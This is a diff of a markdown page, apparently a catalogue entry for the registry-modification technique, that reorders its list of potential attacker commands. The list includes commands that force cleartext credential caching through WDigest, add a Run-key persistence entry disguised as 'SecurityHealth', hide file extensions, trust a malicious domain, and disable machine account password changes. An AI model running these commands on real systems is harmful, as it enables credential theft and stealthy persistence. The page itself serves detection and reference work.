@@ -33,22 +33,16 @@ The Registry of a remote system may be modified to aid in execution of files as 
 ## Potential Commands
 
 ```
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
-
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
-
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
 $key= "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\bad-domain.com\"
 $name ="bad-subdomain"
 new-item $key -Name $name -Force
 new-itemproperty $key$name -Name https -Value 2 -Type DWORD;
 new-itemproperty $key$name -Name http  -Value 2 -Type DWORD;
 new-itemproperty $key$name -Name *     -Value 2 -Type DWORD;
-
 New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name T1112 -Value "<script>"
-
-powershell/persistence/misc/disable_machine_acct_change
 powershell/persistence/misc/disable_machine_acct_change
 ```
 
